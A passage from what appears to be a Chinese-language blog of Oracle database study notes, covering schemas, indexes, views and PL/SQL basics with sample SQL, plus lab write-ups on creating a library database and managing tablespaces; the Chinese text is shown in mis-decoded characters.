title="ç”¨æˆ·schema"></a>ç”¨æˆ·schema</h4><p>åœ¨ä¸€ä¸ªoracleæ•°æ®åº“ä¸­ï¼Œé€šå¸¸ä¼šå­˜å‚¨å¾ˆå¤šä¸ç”¨ç”¨æˆ·çš„æ•°æ®åº“å¯¹è±¡ï¼Œå¦‚è¡¨ã€ç´¢å¼•ã€è§†å›¾ã€è§¦å‘å™¨ã€å­˜å‚¨è¿‡ç¨‹ã€åºåˆ—å’ŒåŒä¹‰è¯ç­‰ã€‚ä¸ºäº†ä¾¿äºå„ä¸ªç”¨æˆ·çš„æ•°æ®åº“å¯¹è±¡é›†åˆçš„ç»„ç»‡ç®¡ç†ï¼Œåœ¨æ•°æ®åº“ä¸­éœ€è¦å…ˆåˆ›å»ºç”¨æˆ·ï¼ŒåŒæ—¶ç³»ç»Ÿä¹Ÿä¼šåˆ›å»ºä¸è¯¥ç”¨æˆ·åŒåçš„schemaï¼Œä½œä¸ºè¯¥ç”¨æˆ·æ‹¥æœ‰æ•°æ®åº“å¯¹è±¡çš„é€»è¾‘å®¹å™¨ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240110184523270.png" alt="image-20240110184523270" style="zoom: 50%;" /><h3 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h3><p>ç´¢å¼•(index)æ˜¯ä¸€ç§é’ˆå¯¹è¡¨ä¸­æŒ‡å®šåˆ—çš„å€¼è¿›è¡Œæ’åºçš„æ•°æ®ç»“æ„ï¼Œä½¿ç”¨å®ƒå¯ä»¥åŠ å¿«è¡¨ä¸­æ•°æ®çš„æŸ¥è¯¢è®¿é—®ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªé›‡å‘˜ä¿¡æ¯è¡¨ä¸­æœ‰æ•°ä¸‡ä¸ªé›‡å‘˜çš„è¡Œæ•°æ®ã€‚è‹¥è¦å¯¹è¯¥è¡¨è¿›è¡Œé›‡å‘˜ä¿¡æ¯æŸ¥è¯¢ï¼Œæœ€åŸºæœ¬çš„ä¿¡æ¯æŸ¥è¯¢æ–¹å¼æ˜¯å…¨è¡¨æ£€ç´¢ï¼Œå³å°†è¡¨ä¸­æ‰€æœ‰é›‡å‘˜çš„è¡Œæ•°æ®ä¸€ä¸€å–å‡ºï¼Œå¹¶ä¸æŸ¥è¯¢æ¡ä»¶é€ä¸€å¯¹æ¯”ï¼Œç„¶åè¿”å›æ»¡è¶³æ¡ä»¶çš„è¡Œæ•°æ®ã€‚è¿™æ ·çš„æ•°æ®æŸ¥è¯¢ä¼šå¸¦æ¥DBMSçš„å¤§é‡å¼€é”€ã€‚å½“åœ¨æœ‰ç´¢å¼•çš„è¡¨ä¸­è¿›è¡Œæ•°æ®æŸ¥è¯¢æ—¶ï¼Œé¦–å…ˆåœ¨è¯¥è¡¨çš„ç´¢å¼•ç»“æ„ä¸­æŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„ç´¢å¼•å€¼ï¼Œç„¶åå†æ ¹æ®ç´¢å¼•å€¼æ‰€å…³è”çš„åœ°å€æŒ‡é’ˆåœ¨ç£ç›˜æ•°æ®å—ä¸­ç›´æ¥å®šä½åˆ°å¯¹åº”çš„æ•°æ®è®°å½•ï¼Œä»è€Œå®ç°å¿«é€Ÿæ•°æ®æŸ¥è¯¢ã€‚</p><p>ä¸ºä»€ä¹ˆæ·»åŠ äº†ç´¢å¼•ä¹‹åï¼Œä¼šåŠ å¿«æŸ¥è¯¢é€Ÿåº¦å‘¢ï¼Ÿ<br>å›¾ä¹¦é¦†ï¼šå¦‚æœæ‚ä¹±åœ°æ”¾ä¹¦çš„è¯æ£€ç´¢èµ·æ¥å°±éå¸¸å›°éš¾,æ‰€ä»¥å°†ä¹¦åˆ†ç±»ï¼Œç„¶åå†å»ºä¸€ä¸ªç®±å­ï¼Œç®±å­é‡Œé¢æ”¾å¡ç‰‡ï¼Œå¡ç‰‡é‡Œé¢å¯ä»¥æŒ‰ç±»æŸ¥è¯¢,æŒ‰ä¹¦åæŸ¥æˆ–è€…ç±»åˆ«æŸ¥,è¿™æ ·çš„è¯é€Ÿåº¦ä¼šå¿«å¾ˆå¤šå¾ˆå¤šï¼Œè¿™ä¸ªå°±æœ‰ç‚¹åƒç´¢å¼•ã€‚ç´¢å¼•çš„å¥½å¤„å°±æ˜¯æé«˜ä½ æ‰¾åˆ°ä¹¦çš„é€Ÿåº¦ï¼Œä½†æ˜¯æ­£æ˜¯å› ä¸ºä½ å»ºäº†ç´¢å¼•ï¼Œå°±åº”è¯¥æœ‰äººä¸“é—¨æ¥ç»´æŠ¤ç´¢å¼•ï¼Œç»´æŠ¤ç´¢å¼•æ˜¯è¦æœ‰æ—¶é—´ç²¾åŠ›çš„å¼€é”€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç´¢å¼•æ˜¯ä¸èƒ½ä¹±å»ºçš„ã€‚<br>æ‰€ä»¥å»ºç´¢å¼•æœ‰ä¸ªåŸåˆ™ï¼šå¦‚æœæœ‰ä¸€ä¸ªå­—æ®µå¦‚æœä¸ç»å¸¸æŸ¥è¯¢ï¼Œå°±ä¸è¦å»å»ºç´¢å¼•ã€‚ç°åœ¨æŠŠä¹¦å˜æˆæˆ‘ä»¬çš„è¡¨ï¼ŒæŠŠå¡ç‰‡å˜æˆæˆ‘ä»¬çš„ç´¢å¼•ï¼Œå°±çŸ¥é“ä¸ºä»€ä¹ˆç´¢å¼•ä¼šå¿«ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰å¼€é”€ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">èŒƒä¾‹ï¼šç»™ person è¡¨çš„ name å»ºç«‹ç´¢å¼•</span><br><span class="line"><span class="keyword">create</span> index pname_index <span class="keyword">on</span> person(name);</span><br><span class="line">èŒƒä¾‹ï¼šç»™ person è¡¨åˆ›å»ºä¸€ä¸ª name å’Œ gender çš„ç´¢å¼•</span><br><span class="line"><span class="keyword">create</span> index pname_gender_index <span class="keyword">on</span> person(name, gender);</span><br></pre></td></tr></table></figure><h3 id="è§†å›¾"><a href="#è§†å›¾" class="headerlink" title="è§†å›¾"></a>è§†å›¾</h3><p>è§†å›¾æ˜¯ä¸€ç§å»ºç«‹åœ¨åŸºç¡€è¡¨æˆ–å…¶ä»–è§†å›¾ä¹‹ä¸Šçš„è™šæ‹Ÿè¡¨ã€‚ç”¨æˆ·åŒæ ·å¯ä»¥ä½¿ç”¨SQLè¯­å¥å¯¹è§†å›¾è¿›è¡Œæ•°æ®æ’å…¥ã€ä¿®æ”¹ã€åˆ é™¤å’Œå¹´æ•°æ®æŸ¥è¯¢å¤„ç†ã€‚</p><p>è§†å›¾å°±æ˜¯æä¾›ä¸€ä¸ªæŸ¥è¯¢çš„çª—å£ï¼Œæ‰€æœ‰æ•°æ®æ¥è‡ªäºåŸè¡¨<br> è¯­æ³• ï¼š <code>CREATE VIEW è§†å›¾åç§° AS å­æŸ¥è¯¢</code></p><p>è§†å›¾çš„ä½œç”¨ï¼Ÿ<br> ç¬¬ä¸€ï¼šè§†å›¾å¯ä»¥å±è”½æ‰ä¸€äº›æ•æ„Ÿå­—æ®µã€‚<br> ç¬¬äºŒï¼šä¿è¯æ€»éƒ¨å’Œåˆ†éƒ¨æ•°æ®åŠæ—¶ç»Ÿä¸€ã€‚ï¼ˆæ€»éƒ¨æ“çºµå®é™…çš„è¡¨ï¼Œåˆ†éƒ¨æŸ¥è¯¢è§†å›¾è¿™æ ·ä¿è¯æ•°æ®çš„ç»Ÿä¸€ï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">---æŸ¥è¯¢è¯­å¥åˆ›å»ºè¡¨</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp <span class="keyword">as</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> scott.emp;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp;</span><br><span class="line"><span class="comment">---åˆ›å»ºè§†å›¾ã€å¿…é¡»æœ‰dbaæƒé™ã€‘</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> v_emp <span class="keyword">as</span> <span class="keyword">select</span> ename, job <span class="keyword">from</span> emp;</span><br><span class="line"><span class="comment">---æŸ¥è¯¢è§†å›¾</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> v_emp;</span><br><span class="line"><span class="comment">---ä¿®æ”¹è§†å›¾[ä¸æ¨è]ï¼Œå®é™…çš„æ•°æ®ä¹Ÿä¼šæ”¹å˜</span></span><br><span class="line"><span class="keyword">update</span> v_emp <span class="keyword">set</span> job<span class="operator">=</span><span class="string">&#x27;CLERK&#x27;</span> <span class="keyword">where</span> ename<span class="operator">=</span><span class="string">&#x27;ALLEN&#x27;</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="comment">---åˆ›å»ºåªè¯»è§†å›¾</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> v_emp1 <span class="keyword">as</span> <span class="keyword">select</span> ename, job <span class="keyword">from</span> emp <span class="keyword">with</span> read <span class="keyword">only</span>;</span><br></pre></td></tr></table></figure><h2 id="åç«¯ç¼–ç¨‹"><a href="#åç«¯ç¼–ç¨‹" class="headerlink" title="åç«¯ç¼–ç¨‹"></a>åç«¯ç¼–ç¨‹</h2><h3 id="PL-SQLæ¦‚è¿°"><a href="#PL-SQLæ¦‚è¿°" class="headerlink" title="PL&#x2F;SQLæ¦‚è¿°"></a>PL&#x2F;SQLæ¦‚è¿°</h3><p>PL&#x2F;SQLæ˜¯è¿‡ç¨‹è¯­è¨€(Procedural Language) ä¸ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€(SQL)ç»“åˆè€Œæˆçš„ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒæ˜¯æ ‡å‡†SQLè¯­è¨€çš„åŠŸèƒ½ä¸æˆã€‚SQLè¯­è¨€é€‚åˆå…³ç³»å…³ç³»å‹æ•°æ®åº“ï¼Œä½†æ˜¯æ— æ³•æ»¡è¶³åº”ç”¨ç¨‹åºå¯¹æ•°æ®æ›´å¤æ‚çš„å¤„ç†éœ€æ±‚ã€‚PL&#x2F;SQLè¯­è¨€æ”¯æŒå¤šç§æ•°æ®ç±»å‹ï¼Œå¦‚å¤§å¯¹è±¡å’Œé›†åˆç±»å‹ï¼Œå¯ä½¿ç”¨æ¡ä»¶å’Œå¾ªç¯ç­‰æ§åˆ¶ç»“æ„ï¼Œç”¨äºåˆ›å»ºå­˜å‚¨è¿‡ç¨‹ã€å‡½æ•°ã€ä¹¦æ³•å™¨ã€PL&#x2F;SQLåŒ…å’Œç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œç»™SQLè¯­è¨€çš„æ‰§è¡Œæ·»åŠ ç¨‹åºé€»è¾‘ã€‚oracle PL&#x2F;SQLåœ¨ä¼ä¸šåŠåº”ç”¨ç¨‹åºä¸­çš„åº”ç”¨å¹¿æ³›ï¼Œè€Œä¸”oracleçš„ä¸€äº›åŠŸèƒ½éƒ¨ä»¶ä¹Ÿæ˜¯ä½¿ç”¨PL&#x2F;SQLç¼–å†™çš„ã€‚</p><h4 id="ç»“æ„å¿«"><a href="#ç»“æ„å¿«" class="headerlink" title="ç»“æ„å¿«"></a>ç»“æ„å¿«</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--PL/SQLå—åŸºæœ¬ç»“æ„ï¼š</span></span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    variable_name [CONSTANT] type[(size)] [<span class="keyword">NOT</span> <span class="keyword">NULL</span>] [:<span class="operator">=</span><span class="keyword">value</span>];  </span><br><span class="line">       <span class="comment">-- DECLARE å¯é€‰,å£°æ˜éƒ¨åˆ†: </span></span><br><span class="line">       <span class="comment">--åœ¨æ­¤å£°æ˜PL/SQLç”¨åˆ°çš„å˜é‡,å¸¸é‡,ç±»å‹,æ¸¸æ ‡ ä»¥åŠå±€éƒ¨çš„å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°;</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">       <span class="comment">-- BEGIN~end å¿…é¡»é¡¹,æ‰§è¡Œéƒ¨åˆ†:</span></span><br><span class="line">       <span class="comment">-- åœ¨æ­¤ç¼–å†™æ‰§è¡Œçš„è¿‡ç¨‹ åŠ SQLè¯­å¥,å³ç¨‹åºçš„ä¸»è¦éƒ¨åˆ†;</span></span><br><span class="line">       EXCEPTION</span><br><span class="line">                <span class="comment">-- EXCEPTION å¯é€‰,æŒ‡å®šå‡ºç°é”™è¯¯æ—¶éœ€è¦æ‰§è¡Œçš„æ“ä½œ</span></span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">        <span class="comment">-- end: è¡¨ç¤ºPl/sqlå—çš„ç»“æŸ,åˆ«å¿˜äº†åˆ†å·ç»“å°¾;</span></span><br><span class="line">        <span class="comment">-- variable_name:å˜é‡åç§°</span></span><br><span class="line"><span class="comment">-- [CONSTANT]   :å¯é€‰è¡¨ç¤ºæ˜¯å¦ä¸ºå¸¸é‡</span></span><br><span class="line"><span class="comment">-- type         :è¡¨ç¤ºå˜é‡çš„æ•°æ®ç±»å‹</span></span><br><span class="line"><span class="comment">-- [(size)]     :å¯é€‰,æ•°æ®ç±»å‹çš„é•¿åº¦</span></span><br><span class="line"><span class="comment">-- [NOT NULL]   :å¯é€‰,è¯¥å˜é‡æ˜¯å¦å¯ä»¥ä¸ºç©º</span></span><br><span class="line"><span class="comment">-- [:=value]    :å¯é€‰,ä½¿ç”¨ := ç»™å¯¹äºå¯¹è±¡èµ‹å€¼ åˆå§‹å€¼;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ä¸Šé¢æ˜¯PL/SQLå—çš„åŸºæœ¬ç»“æ„, BEGIN~END; æ˜¯å¿…é¡»çš„ å£°æ˜éƒ¨åˆ†å’Œå¼‚å¸¸å¤„ç†éƒ¨åˆ†å¹¶ä¸æ˜¯å¿…é¡»çš„..</span></span><br><span class="line"><span class="comment">-- æ˜¯PL/SQLä¸­çš„å•è¡Œæ³¨é‡Š    /**/ å¤šè¡Œæ³¨é‡Š;</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;demo&#x3D;&#x3D;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- scottç”¨æˆ·ä¸‹empä¸¾ä¾‹</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">--PL/SQL æ ¹æ®è¾“å…¥id,è·å¾—å½“å‰ç”¨æˆ·å JOB</span></span><br><span class="line"><span class="comment">-- æ–¹å¼ä¸€:PL/SQLå— æ³¨æ„åˆ†å·~</span></span><br><span class="line"><span class="keyword">declare</span></span><br><span class="line">       <span class="comment">--å£°æ˜å˜é‡ id ename job, æ¯ä¸€ä¸ªå˜é‡ä¹‹é—´ ; åˆ†å·åˆ†éš”...</span></span><br><span class="line">       <span class="comment">--id é€šè¿‡ :=å€¼ è¿›è¡Œèµ‹é»˜è®¤å€¼,å¹¶é€šè¿‡ &amp;xxxç”±Oracleå·¥å…·è¾“å…¥å‚æ•°;</span></span><br><span class="line">       v_id number :<span class="operator">=</span><span class="operator">&amp;</span>myid;  <span class="comment">--è¿˜å¯ä»¥æŠŠ: &amp;myidæ‰‹åŠ¨è¾“å…¥æ¢ä½å›ºå®šçš„ :=7934; å›ºå®šçš„idå·;</span></span><br><span class="line">       v_ename varchar2(<span class="number">50</span>);</span><br><span class="line">       v_JOB varchar2(<span class="number">50</span>);</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">      <span class="keyword">select</span> ename , job </span><br><span class="line">             <span class="keyword">into</span> v_ename,v_JOB </span><br><span class="line">             <span class="keyword">from</span> emp <span class="keyword">where</span> empno <span class="operator">=</span> v_id;</span><br><span class="line">      dbms_output.put_line(<span class="string">&#x27;ç”¨æˆ·å&#x27;</span><span class="operator">||</span>v_ename<span class="operator">||</span><span class="string">&#x27;èŒä½: &#x27;</span><span class="operator">||</span>v_JOB);</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="comment">--  è¿˜å¯ä»¥é€šè¿‡: select into                          ç»™å˜é‡è¿›è¡Œèµ‹å€¼ </span></span><br><span class="line"><span class="comment">--  select åˆ—1,åˆ—2 into å˜é‡1,å˜é‡2 form è¡¨          å½¢å¼è¿›è¡Œä¸‹æ ‡è‡ªåŠ¨æ˜ å°„èµ‹å€¼..å› æ­¤åˆ—ç±»å‹å’Œå˜é‡ç±»å‹ é¡ºåºéƒ½è¦å°½é‡å¯¹åº”</span></span><br><span class="line"><span class="comment">-- dbms_output.put_line();                           Oracleè¿˜å¯ä»¥é€šè¿‡è¯¥è¯­å¥è¿›è¡Œæ•°æ®æ‰“å°è¾“å‡º...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- æ–¹å¼äºŒ: è§£å†³äº†ä¸æ¸…æ¥šå˜é‡ä¸åˆ—çš„ç±»å‹</span></span><br><span class="line"><span class="keyword">declare</span></span><br><span class="line">       v_id    emp.empno<span class="operator">%</span>type :<span class="operator">=</span><span class="operator">&amp;</span>id; </span><br><span class="line">       v_ename emp.ename<span class="operator">%</span>type;</span><br><span class="line">       v_JOB   emp.job<span class="operator">%</span>type;</span><br><span class="line">       v_emp   emp<span class="operator">%</span>Rowtype;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">      <span class="keyword">select</span> ename , job </span><br><span class="line">             <span class="keyword">into</span> v_ename,v_JOB</span><br><span class="line">             <span class="keyword">from</span> emp <span class="keyword">where</span> empno <span class="operator">=</span> v_id;</span><br><span class="line">      dbms_output.put_line(<span class="string">&#x27;ç”¨æˆ·å&#x27;</span><span class="operator">||</span>v_ename<span class="operator">||</span><span class="string">&#x27;èŒä½: &#x27;</span><span class="operator">||</span>v_JOB);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">into</span> v_emp <span class="keyword">from</span> emp <span class="keyword">where</span> empno <span class="operator">=</span> v_id;</span><br><span class="line">      dbms_output.put_line(<span class="string">&#x27;ç”¨æˆ·å&#x27;</span><span class="operator">||</span>v_emp.ename<span class="operator">||</span><span class="string">&#x27;èŒä½: &#x27;</span><span class="operator">||</span>v_emp.job);</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="comment">-- è¡¨.åˆ—%type:  å¯ä»¥åœ¨ä¸æ¸…æ¥šåˆ—ç±»å‹æ—¶å€™ç»™è®¾ç½®ç±»å‹;</span></span><br><span class="line"><span class="comment">-- è¡¨%ROWTYPE:  å¯ä»¥åœ¨ä¸çŸ¥é“è¡¨ä¸­åˆ—ä¸ªæ•° å’Œ æ•°æ®ç±»å‹æ—¶å€™,å¯ä»¥é€šè¿‡  è¡¨%ROWTYPE è·å–ä¸€ä¸ªè¡¨ç±»å‹å˜é‡...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å®éªŒä¸€ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle-æ•°æ®åº“åˆ›å»ºä¸ç»´æŠ¤"><a href="#å®éªŒä¸€ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle-æ•°æ®åº“åˆ›å»ºä¸ç»´æŠ¤" class="headerlink" title="å®éªŒä¸€ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle æ•°æ®åº“åˆ›å»ºä¸ç»´æŠ¤"></a>å®éªŒä¸€ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle æ•°æ®åº“åˆ›å»ºä¸ç»´æŠ¤</h2><h3 id="å®éªŒåŸç†"><a href="#å®éªŒåŸç†" class="headerlink" title="å®éªŒåŸç†"></a>å®éªŒåŸç†</h3><p>åœ¨ windows ç³»ç»Ÿä¸‹ï¼Œåˆ©ç”¨ database Configuration assistance åˆ›å»ºç›¸åº”æ•°æ®åº“ï¼Œå¹¶ä½¿ç”¨ sql developer å’Œ sql plus å¯¹ Oracle æ•°æ®åº“è¿›è¡Œç›¸åº”çš„ç®¡ç†ç­‰æ“ä½œã€‚</p><h3 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h3><ul><li>å›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿæ•°æ®åº“ Lib åˆ›å»ºã€‚</li><li>åœ¨ Oracle æ•°æ®åº“æœåŠ¡å™¨ä¸­å¯¹ Lib æ•°æ®åº“å¯åœæ§åˆ¶ã€‚</li><li>Lib æ•°æ®åº“è¿æ¥ä¸åŸºæœ¬ DBA åŠŸèƒ½æŸ¥çœ‹è®¿é—®ã€‚</li><li>å¯¹ Lib æ•°æ®åº“è¿›è¡Œåˆå§‹åŒ–é…ç½®å‚æ•°ä¿®æ”¹ã€‚</li><li>åœ¨ Lib æ•°æ®åº“ä¸­ï¼Œå¯¹é»˜è®¤ user è¡¨ç©ºé—´å¢åŠ æ•°æ®æ–‡ä»¶ã€‚</li><li>åœ¨ Lib æ•°æ®åº“ä¸­ï¼Œåˆ›å»ºç”¨æˆ·è¡¨ç©ºé—´ T_Libã€‚</li><li>åœ¨ Lib æ•°æ®åº“ä¸­ï¼Œä¿®æ”¹ç”¨æˆ·è¡¨ç©ºé—´ T_Lib é…ç½®å‚æ•°ã€‚</li><li>åœ¨ Lib æ•°æ®åº“ä¸­ï¼Œåˆ é™¤è¡¨ç©ºé—´ T_Libã€‚</li></ul><h3 id="å®éªŒè¿‡ç¨‹"><a href="#å®éªŒè¿‡ç¨‹" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h3><h4 id="æ•°æ®åº“åˆ›å»º"><a href="#æ•°æ®åº“åˆ›å»º" class="headerlink" title="æ•°æ®åº“åˆ›å»º"></a>æ•°æ®åº“åˆ›å»º</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113154224639.png" alt="image-20231113154224639" style="zoom: 33%;" /><p>åˆ›å»ºæˆåŠŸï¼Œç®¡ç†å£ä»¤çš„åœ°æ–¹æŠŠsysçš„å£ä»¤æ”¹äº†ã€‚</p><h4 id="æ•°æ®åº“è¿æ¥"><a href="#æ•°æ®åº“è¿æ¥" class="headerlink" title="æ•°æ®åº“è¿æ¥"></a>æ•°æ®åº“è¿æ¥</h4><p>ç”±äºæœ¬äººSQL developerè«åå…¶å¦™ä¸è§äº†ï¼Œæ‰€ä»¥ä¸‹è½½äº†PL&#x2F;SQL Developerä½œä¸ºæ•°æ®åº“è¿æ¥å·¥å…·ã€‚</p><p>å‘ç°æ²¡æœ‰å¼€å¯ç›‘å¬ç¨‹åºè¿˜æ˜¯å•¥ï¼Œæ‰“å¼€Oracle Net Config Assistant é‡æ–°é…ç½®ç›‘å¬ç¨‹åºï¼Œè®¾ç½®é»˜è®¤ç«¯å£1521ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113215951229.png" alt="image-20231113215951229" style="zoom: 33%;" /><p>ç„¶åä½¿ç”¨navicatè¿›è¡Œè¿æ¥ï¼Œæ³¨æ„sysç”¨æˆ·æ˜¯éœ€è¦åœ¨é«˜çº§çš„åœ°æ–¹è®¾ç½®èº«ä»½ï¼</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113220439385.png" alt="image-20231113220439385" style="zoom:33%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113220509874.png" alt="image-20231113220509874" style="zoom:33%;" /><h4 id="åˆ›å»ºè¡¨ç©ºé—´"><a href="#åˆ›å»ºè¡¨ç©ºé—´" class="headerlink" title="åˆ›å»ºè¡¨ç©ºé—´"></a>åˆ›å»ºè¡¨ç©ºé—´</h4><p><code>create tablespace T_lib datafile &#39;E:\app\oracle\oradata\LIB\DATAFILE\T_lib.DBF&#39; size 8M autoextend on next 5M maxsize 10M;</code></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113220936097.png" alt="image-20231113220936097" style="zoom:33%;" /><p>ä¿®æ”¹è¡¨ç©ºé—´é…ç½®ã€‚è®¾ç½®è¡¨ç©ºé—´è‡ªåŠ¨æ‰©å®¹ï¼Œè®¾ç½®æœ€å¤§å®¹é‡</p><p><code>alter database DATAFILE &#39;E:\app\oracle\oradata\LIB\DATAFILE\T_lib.DBF&#39;  autoextend on next 200M maxsize 500M;</code></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113221229121.png" alt="image-20231113221229121" style="zoom:33%;" /><p>åˆ é™¤è¡¨ç©ºé—´</p><p><code>drop tablespace T_lib;</code></p><h2 id="å®éªŒäºŒï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle-æ•°æ®åº“å¯¹è±¡åˆ›å»ºä¸-SQL-æ“ä½œ"><a href="#å®éªŒäºŒï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle-æ•°æ®åº“å¯¹è±¡åˆ›å»ºä¸-SQL-æ“ä½œ" class="headerlink" title="å®éªŒäºŒï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle æ•°æ®åº“å¯¹è±¡åˆ›å»ºä¸ SQL æ“ä½œ"></a>å®éªŒäºŒï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle æ•°æ®åº“å¯¹è±¡åˆ›å»ºä¸ SQL æ“ä½œ</h2><h3 id="å®éªŒåŸç†-1"><a href="#å®éªŒåŸç†-1" class="headerlink" title="å®éªŒåŸç†"></a>å®éªŒåŸç†</h3><p>æ•°æ®åº“å¯¹è±¡çš„åˆ›å»ºåº”åœ¨ sys è´¦æˆ·ç™»é™†çš„æƒ…å†µä¸‹ï¼Œåœ¨ sqldeveloper ä¸­é€‰æ‹©æ–°å»ºç”¨æˆ·ï¼Œè®¾<br>ç½®ç”¨æˆ·åï¼Œæˆäºˆç”¨æˆ·æ‰€éœ€çš„æƒé™å¹¶è®¾å®šå¯†ç ã€‚åˆ›å»ºå®Œæ•°æ®åº“å¯¹è±¡åå³å¯åœ¨ sqldeveloper ä¸­<br>åˆ›å»ºè¯¥æ•°æ®åº“å¯¹è±¡æ‰€å¯¹åº”çš„é“¾æ¥ï¼Œç„¶åè¿›å…¥åˆ°è¯¥é“¾æ¥å¯¹è¯¥æ•°æ®åº“å¯¹è±¡ä¸­çš„è¡¨è¿›è¡Œç›¸åº”çš„åˆ›<br>å»ºã€ä¿®æ”¹ã€åˆ é™¤ã€æŸ¥è¯¢ã€ç»Ÿè®¡ç­‰æ“ä½œ</p><h3 id="å®éªŒæ­¥éª¤-1"><a href="#å®éªŒæ­¥éª¤-1" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h3><ul><li>åœ¨Libæ•°æ®åº“ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªæ–¹æ¡ˆå¯¹è±¡ Library_DBAã€‚</li><li>è®¾è®¡ Lib æ•°æ®åº“å„å…³ç³»è¡¨ç»“æ„ï¼Œä»¥åŠè§†å›¾ã€ç´¢å¼•ã€åºåˆ—ç­‰ã€‚</li><li>ç¼–ç¨‹ä¸æ‰§è¡Œ SQL 